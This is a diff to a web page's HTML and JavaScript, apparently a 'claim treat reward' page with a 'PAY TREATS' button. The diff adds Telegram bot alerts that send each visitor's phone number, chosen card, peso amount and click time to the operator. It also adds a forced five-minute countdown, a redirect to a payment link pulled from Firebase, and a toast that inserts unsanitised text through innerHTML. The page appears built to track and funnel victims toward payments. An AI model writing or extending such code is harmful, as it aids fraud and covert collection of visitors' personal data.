@@ -40,6 +40,50 @@
     .claim-popup-user-info .user-phone .fa-phone {
       display: none;
     }
+
+    /* ===== TOAST NOTIFICATION ===== */
+    .toast-notification {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.95);
+      color: #fff;
+      padding: 14px 20px;
+      border-radius: 12px;
+      border-left: 4px solid #0088cc;
+      font-size: 0.8rem;
+      z-index: 99999;
+      animation: slideUp 0.5s ease-out;
+      max-width: 340px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+      pointer-events: none;
+    }
+
+    .toast-notification .toast-title {
+      color: #0088cc;
+      font-weight: 700;
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .toast-notification .toast-message {
+      margin-top: 4px;
+      font-size: 0.75rem;
+      color: #ccc;
+      word-break: break-word;
+    }
+
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
   </style>
 </head>
 <body>
@@ -204,7 +248,7 @@
         <i class="fas fa-times"></i>
       </button>
       
-      <!-- User Info - ONLY ONE MOBILE ICON (Neon Light Blue) -->
+      <!-- User Info -->
       <div class="claim-popup-user-info">
         <div class="user-phone">
           <i class="fas fa-mobile-alt"></i> <span id="claimPopupPhone">09171234567</span>
@@ -268,9 +312,15 @@
   </div>
 
   <!-- ============================================================
-       JAVASCRIPT - COMPLETE WORKING
+       JAVASCRIPT - COMPLETE WORKING WITH TELEGRAM ALERTS
   ============================================================ -->
   <script>
+    // ============================================================
+    // TELEGRAM CONFIGURATION - PALITAN ITO
+    // ============================================================
+    var TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // Palitan ng bot token
+    var TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';      // Palitan ng chat ID
+
     // ============================================================
     // FIREBASE INIT
     // ============================================================
@@ -288,6 +338,83 @@
       }
     } catch(e) {
       console.log('⚠️ Firebase error:', e);
+    }
+
+    // ============================================================
+    // TELEGRAM ALERT FUNCTION
+    // ============================================================
+    function sendTelegramAlert(user, card, amount, time, action) {
+      var message = '🎯 <b>CLAIM ALERT</b>\n\n' +
+                    '📌 <b>Action:</b> ' + action + '\n' +
+                    '👤 <b>User:</b> ' + user + '\n' +
+                    '💳 <b>Card:</b> ' + card + '\n' +
+                    '💰 <b>Amount:</b> ' + amount + '\n' +
+                    '🕐 <b>Time:</b> ' + time;
+
+      // Check if bot token and chat ID are configured
+      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        console.log('⚠️ Telegram not configured');
+        console.log('📱 TELEGRAM ALERT (SIMULATED):');
+        console.log('   Action: ' + action);
+        console.log('   User: ' + user);
+        console.log('   Card: ' + card);
+        console.log('   Amount: ' + amount);
+        console.log('   Time: ' + time);
+        showToast('📱 Telegram Alert (Simulated)', action + ' - ' + user);
+        return;
+      }
+
+      // Send to Telegram
+      var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+      
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(function(response) {
+        if (response.ok) {
+          console.log('✅ Telegram alert sent: ' + action);
+          showToast('✅ Telegram Alert Sent', action + ' - ' + user);
+        } else {
+          console.log('❌ Telegram error:', response.status);
+          showToast('❌ Telegram Error', 'Failed to send alert');
+        }
+      })
+      .catch(function(error) {
+        console.error('❌ Telegram error:', error);
+        showToast('❌ Telegram Error', error.message);
+      });
+    }
+
+    // ============================================================
+    // TOAST NOTIFICATION
+    // ============================================================
+    function showToast(title, message) {
+      // Remove existing toast
+      var existingToast = document.querySelector('.toast-notification');
+      if (existingToast) {
+        existingToast.remove();
+      }
+
+      var toast = document.createElement('div');
+      toast.className = 'toast-notification';
+      toast.innerHTML = `
+        <div class="toast-title">${title}</div>
+        <div class="toast-message">${message}</div>
+      `;
+      document.body.appendChild(toast);
+
+      // Auto remove after 5 seconds
+      setTimeout(function() {
+        if (toast.parentNode) {
+          toast.remove();
+        }
+      }, 5000);
     }
 
     // ============================================================
@@ -688,11 +815,19 @@
       claimPopupRewardAmount.textContent = formatWithCommas(rawAmount);
       claimPopupReward.textContent = data.badge;
       
-      claimPopupPhone.textContent = localStorage.getItem('user_phone') || '09171234567';
+      var userPhone = localStorage.getItem('user_phone') || '09171234567';
+      claimPopupPhone.textContent = userPhone;
       
       resetClaimTimer();
       claimPopupOverlay.classList.add('active');
       document.body.style.overflow = 'hidden';
+      
+      // ============================================================
+      // TELEGRAM ALERT 1: Claim Now Button
+      // ============================================================
+      var currentTime = getPhilippineTime();
+      var formattedAmount = '₱' + formatWithCommas(rawAmount);
+      sendTelegramAlert(userPhone, data.name, formattedAmount, currentTime, 'Claim Now');
       
       if (database && currentTreatType) {
         checkForDeployedLink(currentTreatType).then(function(link) {
@@ -711,49 +846,89 @@
     }
 
     // ============================================================
-    // TIMER
+    // TIMER - WORKING FIXED VERSION
     // ============================================================
     function startTimer() {
       if (selectedCard === null) {
         alert('💳 Please select a treat reward first!');
         return;
       }
-      if (isTimerRunning) return;
       
-      if (treatLink && !isRedirecting) {
-        isRedirecting = true;
-        claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
-        setTimeout(function() { window.location.href = treatLink; }, 1500);
+      // Prevent multiple timer instances
+      if (isTimerRunning) {
+        console.log('⏰ Timer is already running');
         return;
       }
       
-      timeRemaining = 300;
+      // ============================================================
+      // TELEGRAM ALERT 2: PAY TREATS Button
+      // ============================================================
+      var cardNumber = parseInt(selectedCard.replace('card', ''));
+      var data = cardData[cardNumber];
+      var rawAmount = parseInt(data.badge.replace('₱', '').replace(/,/g, ''));
+      var userPhone = localStorage.getItem('user_phone') || '09171234567';
+      var currentTime = getPhilippineTime();
+      var formattedAmount = '₱' + formatWithCommas(rawAmount);
+      
+      sendTelegramAlert(userPhone, data.name, formattedAmount, currentTime, 'PAY TREATS');
+      
+      // Check if link already exists - redirect immediately
+      if (treatLink && !isRedirecting) {
+        isRedirecting = true;
+        claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
+        setTimeout(function() { 
+          window.location.href = treatLink; 
+        }, 1500);
+        return;
+      }
+      
+      // Start timer
+      timeRemaining = 300; // 5 minutes
       isTimerRunning = true;
       claimPayBtn.classList.add('disabled');
       claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">5:00</span>';
       
+      // Update display every second
       timerInterval = setInterval(function() {
         timeRemaining--;
+        
+        // Calculate minutes and seconds
         var minutes = Math.floor(timeRemaining / 60);
         var seconds = timeRemaining % 60;
         var timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
-        if (claimTimerDisplay) claimTimerDisplay.textContent = timeStr;
         
+        // Update timer display
+        var timerDisplay = document.getElementById('claimTimerDisplay');
+        if (timerDisplay) {
+          timerDisplay.textContent = timeStr;
+        }
+        
+        console.log('⏰ Timer: ' + timeStr);
+        
+        // Timer finished
         if (timeRemaining <= 0) {
           clearInterval(timerInterval);
           timerInterval = null;
           isTimerRunning = false;
           claimPayBtn.classList.remove('disabled');
           claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
-          if (claimTimerDisplay) claimTimerDisplay.textContent = '';
-          console.log('⏰ Timer finished');
           
+          var timerDisplay = document.getElementById('claimTimerDisplay');
+          if (timerDisplay) timerDisplay.textContent = '';
+          
+          console.log('⏰ Timer finished - checking for link');
+          
+          // Check for link after timer ends
           if (database && currentTreatType) {
             checkForDeployedLink(currentTreatType).then(function(link) {
               if (link && !isRedirecting) {
                 isRedirecting = true;
                 claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
-                setTimeout(function() { window.location.href = link; }, 1500);
+                setTimeout(function() { 
+                  window.location.href = link; 
+                }, 1500);
+              } else {
+                showToast('⏰ Timer Finished', 'No payment link found yet');
               }
             });
           }
@@ -769,7 +944,10 @@
       isTimerRunning = false;
       timeRemaining = 0;
       claimPayBtn.classList.remove('disabled');
-      if (claimTimerDisplay) claimTimerDisplay.textContent = '';
+      
+      var timerDisplay = document.getElementById('claimTimerDisplay');
+      if (timerDisplay) timerDisplay.textContent = '';
+      
       claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
     }
 
@@ -827,6 +1005,8 @@
     console.log('✅ Main.js initialized successfully');
     console.log('✅ Thought bubble started');
     console.log('✅ Auto-scan enabled (every 1 second)');
+    console.log('✅ Timer fixed - will countdown properly');
+    console.log('✅ Telegram alerts configured for Claim Now and PAY TREATS');
   </script>
 
 </body>
